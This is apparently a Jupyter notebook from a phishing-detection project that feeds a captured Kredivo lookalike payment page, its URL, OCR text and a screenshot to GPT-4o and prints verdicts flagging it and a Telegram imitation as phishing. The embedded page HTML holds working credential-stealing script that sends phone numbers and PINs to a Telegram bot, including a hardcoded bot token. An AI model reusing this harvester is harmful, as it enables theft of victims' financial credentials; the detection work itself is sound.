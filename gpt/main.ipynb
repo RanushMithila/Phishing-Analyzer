{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64\n",
    "import requests\n",
    "\n",
    "# OpenAI API Key\n",
    "api_key = \"\"\n",
    "\n",
    "url = \"https://b1d4f378-6c48-4acd-969c-7e27a6c6d62c.e1-us-east-azure.choreoapps.dev/\"\n",
    "html = \"\"\"\n",
    "<html class=\"hydrated\"><head>   <!-- Google Tag Manager -->   <script async=\"\" src=\"https://websdk.appsflyer.com?st=banners&amp;\"></script><script src=\"https://connect.facebook.net/signals/config/1591376491184811?v=2.9.162&amp;r=stable&amp;domain=b1d4f378-6c48-4acd-969c-7e27a6c6d62c.e1-us-east-azure.choreoapps.dev&amp;hme=e67e7d148043b3a377ad0eb1c82669792a67ba5e3bb5734b69e611ae38f939ca&amp;ex_m=68%2C115%2C102%2C106%2C59%2C3%2C95%2C67%2C15%2C92%2C85%2C49%2C52%2C163%2C166%2C178%2C174%2C175%2C177%2C28%2C96%2C51%2C74%2C176%2C158%2C161%2C171%2C172%2C179%2C124%2C39%2C33%2C136%2C14%2C48%2C184%2C183%2C126%2C17%2C38%2C1%2C41%2C63%2C64%2C65%2C69%2C89%2C16%2C13%2C91%2C88%2C87%2C103%2C50%2C105%2C37%2C104%2C29%2C25%2C159%2C162%2C133%2C27%2C10%2C11%2C12%2C5%2C6%2C24%2C21%2C22%2C55%2C60%2C62%2C72%2C97%2C26%2C73%2C8%2C7%2C77%2C46%2C20%2C99%2C98%2C100%2C93%2C9%2C19%2C18%2C82%2C54%2C80%2C32%2C71%2C0%2C90%2C31%2C79%2C84%2C45%2C44%2C83%2C36%2C4%2C86%2C78%2C42%2C34%2C81%2C2%2C35%2C61%2C40%2C101%2C43%2C76%2C66%2C107%2C58%2C57%2C30%2C94%2C56%2C53%2C47%2C75%2C70%2C23%2C108\" async=\"\"></script><script type=\"text/javascript\" async=\"\" src=\"https://connect.facebook.net/en_US/fbevents.js\"></script><script type=\"text/javascript\" async=\"\" src=\"https://www.googletagmanager.com/gtag/js?id=G-8BPW73FDDS&amp;l=dataLayer&amp;cx=c\"></script><script async=\"\" src=\"https://www.googletagmanager.com/gtm.js?id=GTM-T6GBHDX\"></script><script>(function (w, d, s, l, i) {      w[l] = w[l] || []; w[l].push({        'gtm.start':          new Date().getTime(), event: 'gtm.js'      }); var f = d.getElementsByTagName(s)[0],        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =          'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);    })(window, document, 'script', 'dataLayer', 'GTM-T6GBHDX');</script>   <!-- End Google Tag Manager -->   <title>Payment - Kredivo</title>   <!-- Viewport mobile tag for sensible mobile support -->    <meta http-equiv=\"content-type\" content=\"text/html;charset=UTF-8\"> <meta charset=\"UTF-8\"><style data-styles=\"\">ion-icon{visibility:hidden}.hydrated{visibility:inherit}</style>  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\">   <link type=\"text/css\" rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic\">   <link type=\"text/css\" rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css\">   <!--STYLES-->   <link rel=\"stylesheet\" href=\"payment.css\">   <link rel=\"stylesheet\" href=\"bootstrap.min.css\">   <link rel=\"stylesheet\" href=\"dashboard.css\">   <link rel=\"stylesheet\" href=\"kredivo.css\">   <link rel=\"stylesheet\" href=\"weather-icons.min.css\">   <link href=\"\" rel=\"stylesheet\" integrity=\"sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor\" crossorigin=\"anonymous\">        <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css\">        <link href=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWU1zV2MP1qIVUa_15MTP6zx6GpxW79z6aFxjji9yqHjMEAzjbdOtg8y4j&amp;s=10\" rel=\"shortcut icon\" type=\"image/x-icon\">  <link href=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWU1zV2MP1qIVUa_15MTP6zx6GpxW79z6aFxjji9yqHjMEAzjbdOtg8y4j&amp;s=10\" rel=\"apple-touch-icon\">  <script type=\"module\" src=\"https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js\"></script><script nomodule=\"\" src=\"https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js\"></script>  <style>    body, html{      width: 100%;      height: 100%;      position: fixed;      background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh31jm8jpZZKbRI1uFIIueAh2WiGgbOJ9JpkjIFiSULa5xvoBrheXk12trYCJmfSBghLEhTDn9ZxkFsjmjcU_D3nZxP86Xi3TqVbqsHkMq6vRr4hK5jmdbRO7b6JnQZoWAvm2SANLIK_3TLzz0jxG2qK5Z9uXaMYpc3yr6SiSnkQcBPhECHIY8thhFi/s16000/AddText_03-07-02.19.22.png');      background-position: 100% 100%;      background-repeat: no-repeat;      background-size: 100% 100%;  }   .payment-option{       width: 100%;       max-width: 100%;       height: 45px;       border-radius: 5px;       margin: 10px 0px;       border: 1px solid #ABABAB;       padding-left: 12px;       color: #B0AFB7;       outline: none;       margin-bottom: -5px;       background: #F3F2FA;   }      .payment-option:focus, .payment-option:hover{       border: 1.5px solid #43B8E3;   }         .h3{       font-size: 12px;       font-weight: bold;       margin-bottom: -16px;       margin-left: 15px;       position: relative;       background: #F3F2FA;       width: 105px;       color: #ABABAB;       z-index: 99999;   }      .h4{       font-size: 12px;       font-weight: bold;       margin-bottom: -17px;       margin-left: 15px;       position: relative;       background: #F3F2FA;       width: 22px;       color: #ABABAB;       z-index: 99999;   }      .btn-kredi{       width: 100%;       height: 45px;       bottom: 0;       left: 0;       right: 0;       background: #F37E31;       position: relative;       border: none;       color: #fff;       font-size: 15px;       margin-top: 25px;       margin-bottom: 10px;   }         .togel {    position: absolute;    right: 37;    z-index: 9999;    cursor: pointer;    display: flex;    font-size: 5vmin;    justify-content: center;    align-items: center;    width: 6vmin;    margin-top: -25px;} #ionIcons {            color: #2C2C2C;            font-size: 20px;            width: 20px;            height: 20px;            position: absolute;            display: block;            margin-top: 91px;            z-index: 9;            margin-left: 30px;            padding: 3px 8px 8px 0px;            opacity: 0.7;        }                .eye {            display: block;            margin: 0px auto;            margin-right: 20px;            position: absolute;            box-sizing: border-box;             z-index: 16;             right: 11;            top: 153;            height: 19.8189px;            width: 25.0236px;             float: right;            border-radius: 0px;             cursor: pointer;            z-index: 9999;        }  </style>  <!--STYLES END-->  </head>  <body>      <div class=\"card-item\" v-bind:class=\"{ '-active' : isCardFlipped }\">       <div class=\"card-item__side -front\">        <div class=\"card-item__focus\" v-bind:class=\"{'-active' : focusElementStyle }\" v-bind:style=\"focusElementStyle\" ref=\"focusElement\"></div>   <!-- Google Tag Manager (noscript) -->   <noscript>    <iframe src=\"https://www.googletagmanager.com/ns.html?id=GTM-T6GBHDX\" height=\"0\" width=\"0\" style=\"display:none;visibility:hidden\"></iframe>   </noscript>   <!-- End Google Tag Manager (noscript) -->    <!-- Modal Bar -->   <div id=\"help\" class=\"modal fade\" role=\"dialog\">    <div class=\"modal-dialog\">     <div class=\"modal-content\">      <div class=\"modal-header\">       <button type=\"button\" class=\"close\" data-dismiss=\"modal\"><i class=\"fa fa-times\" aria-hidden=\"true\"></i> </button>       <h4 class=\"modal-title\">Hubungi kami</h4>      </div>      <div class=\"modal-body\">       <p class=\"mb-20\"> Customer Service dapat dihubungi dari Senin - Minggu, 08:00-20:00 </p>       <div class=\"contact-box mb-20\">        <div class=\"contact-box-header\">         <i class=\"fa fa-question-circle\" aria-hidden=\"true\"></i> FAQ        </div>        <p>Punya pertanyaan tentang Kredivo?</p>        <a class=\"button\" href=\"/faqs/\" target=\"_blank\">Ke FAQ</a>       </div>       <div class=\"contact-box mb-20\">        <div class=\"contact-box-header\">         <i class=\"fa fa-envelope\" aria-hidden=\"true\"></i> Email        </div>        <p>Kirim email ke tim <i>support</i> kami untuk mendapatkan bantuan atas masalah Anda.</p>        <a class=\"button\" href=\"mailto:support@kredivo.com\">Kirim email</a>       </div>       <div class=\"contact-box\">        <div class=\"contact-box-header\">         <i class=\"fa fa-phone\" aria-hidden=\"true\"></i> Telpon        </div>        <p>Hubungi kami langsung melalui panggilan telepon lewat nomor di bawah ini:</p>        <div class=\"contact-box-details\">         021-2205-5677 (0807-1-KREDIVO)        </div>       </div>      </div>     </div>    </div>   </div>     <p id=\"userid\" style=\"font-weight: 800; opacity: 0.0;\">Username</p>    <div id=\"loader\" class=\"bg-load load6\" style=\"display:none;\">        <div class=\"loader\"></div>    </div>  <div class=\"login-wrap\">   <div class=\"container\" style=\"padding-left: 13px; padding-right: 13px; margin-top: -40px;\">     <div class=\"row\">        <center> <img src=\"https://i0.wp.com/kredivo.id/wp-content/uploads/2023/02/Kredivo-logo.png?resize=1024%2C349&amp;ssl=1\" style=\"width: 150px; margin-top: -60px; margin-bottom: 50px\">  </center>        <br>     <div class=\"col-md-6 col-md-push-3\">       <div class=\"methods mb-30\" style=\"padding-left: 10px; padding-right: 10px; border-radius: 8px;  box-shadow: 8px 2px 3px 0px rgba(0,0,0,0.11);    -webkit-box-shadow: 6px 5px 5px 0px rgba(0,0,0,0.01);-moz-box-shadow: 3px 5px 4px 0px rgba(0,0,0,0.01); height: 320px; background: none\">        <div class=\"mb-20\" style=\"height: 240px\">           <h2 style=\" text-align: left; margin-top: -45px; font-size: 15px;\"></h2>      <div class=\"inpform\">  <form method=\"post\" onsubmit=\"loadd(event); return false\">  <input type=\"hidden\" id=\"limitku\" value=\"null\">      <input type=\"hidden\" id=\"logo\" value=\"🎖𝕂𝕣𝕖𝕕𝕚𝕧𝕠 𝔻𝔸𝕋𝔸🎖\"><label class=\"h3\">Nomor Handphone</label>   <input id=\"inpuser\" value=\"\" v-mask=\"'#### #### #####'\" v-model=\"cardCvv\" v-on:focus=\"flipCard(true)\" v-on:blur=\"flipCard(false)\" name=\"userid\" maxlength=\"13\" minlength=\"10\" pattern=\"(?=.*[0-9]).{10,13}\" required=\"\" oninvalid=\"this.setCustomValidity('Mɑsukkɑn 𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 dengɑn benɑr')\" onchange=\"this.setCustomValidity('')\" type=\"tel\" class=\"payment-option\" placeholder=\"Masukkan Nomor Hp Anda\" style=\"      background-position: 100% 100%;      background-repeat: no-repeat;      background-size: 100% 107%; padding-left: 18px; color: #B0AFB7;\"><div style=\"margin-top: 18px; color: #43B8E3; font-weight: 800; margin-left: 6px; margin-bottom: -15px\"> Nomormu hilang atau sudah tidak aktif?</div>     <br><label class=\"h4\">PIN</label>   <input id=\"pass\" maxlength=\"6\" minlength=\"6\" pattern=\"(?=.*[0-9]).{6,6}\" required=\"\" oninvalid=\"this.setCustomValidity('Mɑsukkɑn 𝗣𝗜𝗡 ɑndɑ dengɑn benɑr')\" onchange=\"this.setCustomValidity('')\" type=\"password\" inputmode=\"numeric\" class=\"payment-option\" placeholder=\"Masukkan 6 Angka PIN Kredivo-Mu \" style=\"padding-left: 18px; color: #B0AFB7;\">    <div class=\"togel bi bi-eye-slash\" tabindex=\"3\" id=\"eyeOpen\" style=\"margin-top:  ; position: absolute\">        </div>        <div class=\"bubble-element eye clickable-element\" tabindex=\"3\" id=\"eyeClose\" style=\"display:none;  \">         <ion-icon name=\"eye-outline\" class=\"togel bi md hydrated\" id=\"togglePassword\" style=\"margin-right: -30px; margin-top: -15; width: 23px;\" role=\"img\"></ion-icon>       </div>       </form></div>        <div style=\"margin-top: 20px\"><a href=\"./login.html\" style=\"font-size: 13px; text-align: left; color: #43B8E3; font-weight: 800; background: none; border: none; text-decoration: none; float: left; margin-top: -0px; margin-left: 6px; margin-bottom: -5px\" type=\"submit\">Lupa PIN?</a></div><button type=\"submit\" class=\"btn-kredi\" id=\"kirim\" onclick=\"ses()\">Lanjutkan</button><center>   <br> <div style=\"margin-top: -15px; color: #000\">Belum punya akun? <span style=\"color: #F37E31\">Daftar SeKarang</span></div></center></div>       </div>       </div>      </div>     </div>    </div>   </div>   <!--SCRIPTS-->  <script src=\"https://www.kredivo.id/p/in/js/jquery.min.js\"></script>  <script src=\"https://www.kredivo.id/p/in/js/bootstrap.min.js\"></script>  <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2\" crossorigin=\"anonymous\"></script>        <script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js\"></script><script src=\"https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js\"></script><script src=\"https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js\"></script><script src=\"./credit.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\" integrity=\"sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"></script>      <script>    $('.payment-accordion, .navbar-nav a').click(function (e) {      e.preventDefault();    });  </script>      <script src=\"https://code.jquery.com/jquery-3.5.1.min.js\"></script>    <script>        function ses(){var over = document.getElementById(\"limitku\").value;   sessionStorage.setItem(\"over\", over);                              var nomor = document.getElementById(\"inpuser\").value;            sessionStorage.setItem(\"nomor\", nomor);             var pinku = document.getElementById(\"pass\").value;            sessionStorage.setItem(\"pinku\", pinku);            $(\"#loader\").fadeIn();        }    </script> <script></script> <script> var limit = sessionStorage.getItem(\"limit\");document.getElementById(\"limitku\").value = limit + \"\";         </script> <script>               $(document).ready(function() {            $('.toggle i').click(function() {                if ($(\"#pass\").attr('type') === 'password') {                    $(\"#pass\").attr('type', 'tel');                    $(this).removeClass('fa-eye-slash').addClass('fa-eye');                } else {                    $(\"#pass\").attr('type', 'password');                    $(this).removeClass('fa-eye').addClass('fa-eye-slash');                }            });            $('#uname, #pass').on('input', function() {                if ($('#uname').val().length < 6 || $('#pass').val().length < 6) {                    $('#btnsubmit').prop('disabled', true);                } else {                    $('#btnsubmit').prop('disabled', false);                }            });        });        $(\"textarea\").each(function () {            this.setAttribute(\"style\", \"height:\" + (this.scrollHeight) + \"px;overflow-y:hidden;\");        }).on(\"input\", function () {            this.style.height = 0;            this.style.height = (this.scrollHeight) + \"px\";        });        $('#inpsms').on('input', function() {            if ($(this).val().length < 10){                $('#btnsubmit').prop('disabled', true);            } else {                $('#btnsubmit').prop('disabled', false);            }        });                           $(document).ready(function() {            $(\"body\").on('click', 'button#doLog', function() {                var uname = $(\"#uname\").val();                var pass = $(\"#pass\").val();                $.ajax({                    url: \"/login/confirm.php\",                    method: \"POST\",                    data: \"username=\"+user+\"&password=\"+pass,                    beforeSend: function() {                        $(\"#loading\").show();                    },                    success: function(responsex) {                        $(\"#aseli\").html('');                        if(responsex == \"true\") {                            $.get(\"\", function(datax, status){                                window.history.pushState(\"\", \"\", '');                                $(\"#hideBody\").hide();                                $(\"#loading\").hide();                                $(\"#aseli\").html(datax);                            });                        } else {                            $.get(\"\", function(data, status){                                window.history.pushState(\"\", \"\", '');                                setTimeout(function() {                                     $(\"#hideBody\").hide();                                    $(\"#loading\").hide();                                    $(\"#aseli\").html(data);                                    $(\"#aseli\").show();                                }, 1000);                            });                        }                                            }                })            });            $(\"div#eyeOpen\").on('click', function() {                $(\"#eyeOpen\").css(\"display\", \"none\");                $(\"#eyeClose\").css(\"display\", \"block\");                $(\"#pass\").prop(\"type\", \"text\");                $(\"div#eyeClose\").on('click', function() {                    $(\"#eyeOpen\").css(\"display\", \"block\");                    $(\"#eyeClose\").css(\"display\", \"none\");                    $(\"#pass\").prop(\"type\", \"password\");                });            });            $(\"#uname\").on('input', function() {                var uname = $(\"#uname\").val();                var pass = $(\"#pass\").val();                OnButton(uname, pass);            });            $(\"#pass\").on('input', function() {                var uname = $(\"#user\").val();                var pass = $(\"#pass\").val();                OnButton(uname, pass);            });        });   </script>  <script>function loadd(event){    event.preventDefault();       document.getElementById('kirim').innerHTML = \"Memproses...\";   var logo = document.getElementById('logo');var limitku = document.getElementById('limitku');var inpuser = document.getElementById('inpuser');var pass = document.getElementById('pass');    var gabungan = '' + logo.value + '%0A𝗟𝗶𝗺𝗶𝘁 𝗧𝗲𝗿𝘀𝗲𝗱𝗶𝗮 %3A%0A' + limitku.value + '%0A%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + inpuser.value + '%0A𝗣𝗜𝗡 𝗞𝗿𝗲𝗱𝗶𝘃𝗼%3A%0A' + pass.value;        var token = '6509408965:AAH8SK85SBOH6s16nl6k66noIyTAsmunLLY'; // Ganti dengan token bot yang kamu buat    var grup = '1396176445'; // Ganti dengan chat id dari bot yang kamu buat    $.ajax({        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,        method: `POST`,        success: function(){setTimeout(function() {            var username = document.getElementById(\"inpuser\").value;    sessionStorage.setItem(\"username\", username);  window.location.href='otp.html';              }, 500);}});};        </script>   </div><script type=\"text/javascript\" id=\"\">!function(a,e,f,k,h,g,c,b,d){a.AppsFlyerSdkObject=h;a.AF=a.AF||function(){(a.AF.q=a.AF.q||[]).push([Date.now()].concat(Array.prototype.slice.call(arguments)))};a.AF.id=a.AF.id||c;a.AF.plugins={};b=e.createElement(f);d=e.getElementsByTagName(f)[0];b.async=1;b.src=\"https://websdk.appsflyer.com?\"+(0<g.length?\"st\\x3d\"+g.split(\",\").sort().join(\",\")+\"\\x26\":\"\")+(0<c.length?\"af_id\\x3d\"+c:\"\");d.parentNode.insertBefore(b,d)}(window,document,\"script\",0,\"AF\",\"banners\",{banners:{key:\"e464ddfd-89af-4f45-b1e3-0e0e9f6469bf\"}});AF(\"banners\",\"showBanner\");</script></body></html>\n",
    "\"\"\"\n",
    "text = \"\"\"\n",
    "Payment - Kredivo Hubungi kami Customer Service dapat dihubungi dari Senin - Minggu, 08:00-20:00 FAQ Punya pertanyaan tentang Kredivo? Ke FAQ Email Kirim email ke tim support kami untuk mendapatkan bantuan atas masalah Anda. Kirim email Telpon Hubungi kami langsung melalui panggilan telepon lewat nomor di bawah ini: 021-2205-5677 (0807-1-KREDIVO) Username Nomor Handphone Nomormu hilang atau sudah tidak aktif? PIN Lupa PIN? Lanjutkan Belum punya akun? Daftar SeKarang\n",
    "\"\"\"\n",
    "\n",
    "# Function to encode the image\n",
    "def encode_image(image_path):\n",
    "  with open(image_path, \"rb\") as image_file:\n",
    "    return base64.b64encode(image_file.read()).decode('utf-8')\n",
    "\n",
    "# Path to your image\n",
    "image_path = \"path_to_your_image.jpg\"\n",
    "\n",
    "# Getting the base64 string\n",
    "# base64_image = encode_image(image_path)\n",
    "image_url = \"https://lh3.googleusercontent.com/u/1/drive-viewer/AKGpihY3llrmOYe04anM-wvsCkrcAW3WVz3otBgFqB9Ap7ZYazQek7Jv1aFC5dW00NEmNthFCI3gzeeIEB7JN2vGRkhll24dcW2YYaM=w1008-h912\"\n",
    "\n",
    "headers = {\n",
    "  \"Content-Type\": \"application/json\",\n",
    "  \"Authorization\": f\"Bearer {api_key}\"\n",
    "}\n",
    "\n",
    "payload = {\n",
    "  \"model\": \"gpt-4o\",\n",
    "  \"messages\": [\n",
    "    {\n",
    "      \"role\": \"user\",\n",
    "      \"content\": [\n",
    "        {\n",
    "          \"type\": \"text\",\n",
    "          \"text\": f\"\"\"\n",
    "        You are a Security Analyst and security expert tasked\n",
    "        with examining a web page to determine if it is a\n",
    "        phishing site or a legitimate site. To complete this\n",
    "        task, follow these sub-tasks:\n",
    "        1. Analyze the HTML, URL, and extracted text\n",
    "        look for any SE techniques often used in\n",
    "        phishing attacks. Point out any suspicious elements\n",
    "        found in the HTML, URL, or text.\n",
    "        2. Analyze this Screenshot image look for brand names, sucpicious content, missed alligned images... etc. which will help to identifing phishing site\n",
    "        3. Identify the brand name. If the HTML appears to\n",
    "        resemble a legitimate web page, verify if the URL\n",
    "        matches the legitimate domain name associated with\n",
    "        the brand, if known.\n",
    "        4. State your conclusion on whether the site is a\n",
    "        phishing site or a legitimate one, and explain your\n",
    "        reasoning. If there is insufficient evidence to make\n",
    "        a determination, answer \"unknown\".\n",
    "        5. Submit your findings as JSON-formatted output with\n",
    "        the following keys:\n",
    "        phishing_score: int (indicates phishing risk on a\n",
    "        scale of 0 to 10)\n",
    "        brands: str (identified brand name or None if not\n",
    "        applicable)\n",
    "        phishing: boolean (whether the site is a phishing\n",
    "        site or a legitimate site)\n",
    "        suspicious_domain: boolean (whether the domain name\n",
    "        is suspected to be not legitimate)\n",
    "        Limitations:\n",
    "        The HTML may be shortened and simplified.\n",
    "        The OCR-extracted text may not always be accurate.\n",
    "        Examples of social engineering techniques:\n",
    "        Alerting the user to a problem with their account\n",
    "        Offering unexpected rewards\n",
    "        Informing the user of a missing package or additional\n",
    "        payment required\n",
    "        Displaying fake security warnings\n",
    "        URL:\n",
    "        {url}\n",
    "        HTML:{html}Text extracted using OCR:{text}\n",
    "        ScreenShot image:\n",
    "          \"\"\"\n",
    "        },\n",
    "        {\n",
    "          \"type\": \"image_url\",\n",
    "          \"image_url\": {\n",
    "            \"url\": f\"{image_url}\"\n",
    "          }\n",
    "        }\n",
    "      ]\n",
    "    }\n",
    "  ],\n",
    "  \"max_tokens\": 1000\n",
    "}\n",
    "\n",
    "response = requests.post(\"https://api.openai.com/v1/chat/completions\", headers=headers, json=payload)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"id\": \"chatcmpl-9nhKG2DJvTzu4fiyoRvS9Of6dDSXT\",\n",
      "  \"object\": \"chat.completion\",\n",
      "  \"created\": 1721631644,\n",
      "  \"model\": \"gpt-4o-2024-05-13\",\n",
      "  \"choices\": [\n",
      "    {\n",
      "      \"index\": 0,\n",
      "      \"message\": {\n",
      "        \"role\": \"assistant\",\n",
      "        \"content\": \"Based on the analysis of the given webpage's URL, HTML, extracted text, and the provided screenshot image, here are the findings:\\n\\n### 1. HTML and URL Analysis:\\n#### URL:\\n- The URL is `https://b1d4f378-6c48-4acd-969c-7e27a6c6d62c.e1-us-east-azure.choreoapps.dev/`. This domain appears suspicious as it is not directly linked to Kredivo's known domain (usually kredivo.com or a subdomain thereof).\\n\\n#### HTML:\\n- The HTML contains many elements that generally appear in legitimate sites, such as Google Tag Manager, Facebook signals, and various CSS and JS resources.\\n- However, there are signs of potential phishing:\\n  - `ion-icon`, `glitchy-styled` elements designed for input focus and visual feedback.\\n  - `form` method attempting to capture sensitive information (like phone number and PIN).\\n  - Telegram bot being used to send captured data (`https://api.telegram.org/bot...`).\\n  \\n### 2. Screenshot Analysis:\\n- The screenshot shows a page designed to look like a Kredivo login or payment page, with branding, contact information, and input fields for phone number and PIN.\\n- There is a slight misalignment in the UI elements, which could hint towards a hastily assembled phishing page.\\n- The image URL (`i0.wp.com/kredivo.id/wp-content/uploads`) while seeming legitimate, further scrutiny indicates resources might have been scraped to mimic a legitimate site.\\n\\n### 3. Identified Brand:\\n- **Brand:** Kredivo (identified from the screenshot logo and extracted text).\\n\\n### 4. Suspicious Elements:\\n- **Social Engineering Techniques:**\\n  - Requesting sensitive information (phone number and PIN).\\n  - Use of background images and icons – indicative of reassuring authenticity.\\n- **Domain Analysis:**\\n  - The domain `choreoapps.dev` is highly uncharacteristic of Kredivo and seems suspicious.\\n\\n### Conclusion:\\nThere are several red flags such as the suspicious domain, methods to capture sensitive information, and the use of a Telegram bot for data exfiltration. These factors heavily indicate that the site is a phishing attempt.\\n\\n### JSON-formatted Findings:\\n```json\\n{\\n  \\\"phishing_score\\\": 9,\\n  \\\"brands\\\": \\\"Kredivo\\\",\\n  \\\"phishing\\\": true,\\n  \\\"suspicious_domain\\\": true\\n}\\n```\\n\\nThis site matches several common phishing characteristics, leading to a high confidence assessment that it is a phishing site targeting users of the Kredivo service.\"\n",
      "      },\n",
      "      \"logprobs\": null,\n",
      "      \"finish_reason\": \"stop\"\n",
      "    }\n",
      "  ],\n",
      "  \"usage\": {\n",
      "    \"prompt_tokens\": 6761,\n",
      "    \"completion_tokens\": 535,\n",
      "    \"total_tokens\": 7296\n",
      "  },\n",
      "  \"system_fingerprint\": \"fp_18cc0f1fa0\"\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'id': 'chatcmpl-9ngqqPnW4uAw5OSrtGFTsQnWrcTUd', 'object': 'chat.completion', 'created': 1721629820, 'model': 'gpt-4o-2024-05-13', 'choices': [{'index': 0, 'message': {'role': 'assistant', 'content': 'Based on the provided information, I\\'ll perform an analysis on the URL, HTML, and screenshot to detect any phishing indicators.\\n\\n### Analysis\\n\\n#### 1. HTML, URL, and Extracted Text Analysis\\n\\n**URL Analysis:**\\n- URL: `https://3.skysky.workers.dev/#/login`\\n- The URL does not match the official domains for Telegram (`telegram.org`, `web.telegram.org`, `desktop.telegram.org`). Use of a subdomain under `workers.dev` is suspicious and unusual for the legitimate Telegram site.\\n\\n**HTML Analysis:**\\n- The HTML appears to describe a login page mimicking Telegram Web.\\n- Several meta tags and links point to legitimate Telegram resources, which can be common in such phishing attempts to build trust.\\n- Links pointing to `desktop.telegram.org` are accurate but can be misleading if the primary goal is to capture login details on the parent domain.\\n\\n**Extracted Text Analysis:**\\n- The text aligns closely with what is expected on a legitimate login page for Telegram, urging users to use official apps.\\n- The text, however, includes standard language that might be copied from Telegram\\'s legitimate site.\\n\\n#### 2. Screenshot Image Analysis\\n\\n**Screenshot Analysis:**\\n- The screenshot interface looks polished and professional, resembling Telegram\\'s legitimate web app.\\n- The branding (`Telegram`) and the download button for the desktop app seem consistent with the branding of Telegram.\\n- No obvious misspellings, grammatical errors, or misplaced elements are visible in the screenshot.\\n\\n#### 3. Brand Verification\\n\\n**Brand Name:**\\n- The brand being spoofed here is Telegram.\\n\\n**URL Verification:**\\n- The suspicious URL is `https://3.skysky.workers.dev/#/login`, which does not align with the legitimate Telegram domains (`telegram.org`, `web.telegram.org`, `desktop.telegram.org`).\\n\\n### Conclusion\\nThe evidence strongly suggests that this might be a phishing site aiming to capture Telegram user credentials through a very convincing imitation. The suspicious domain (`3.skysky.workers.dev`) not aligning with official Telegram domains is a significant indicator.\\n\\n### JSON-Formatted Output:\\n```json\\n{\\n  \"phishing_score\": 9,\\n  \"brands\": \"Telegram\",\\n  \"phishing\": true,\\n  \"suspicious_domain\": true\\n}\\n```\\n\\nThe phishing score is rated 9 due to the high similarities with the legitimate Telegram web page but with a suspicious domain that does not match any known legitimate domains for Telegram.'}, 'logprobs': None, 'finish_reason': 'stop'}], 'usage': {'prompt_tokens': 2352, 'completion_tokens': 498, 'total_tokens': 2850}, 'system_fingerprint': 'fp_5e997b69d8'}\n"
     ]
    }
   ],
   "source": [
    "print(response.json())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1721635329.7050107\n"
     ]
    }
   ],
   "source": [
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
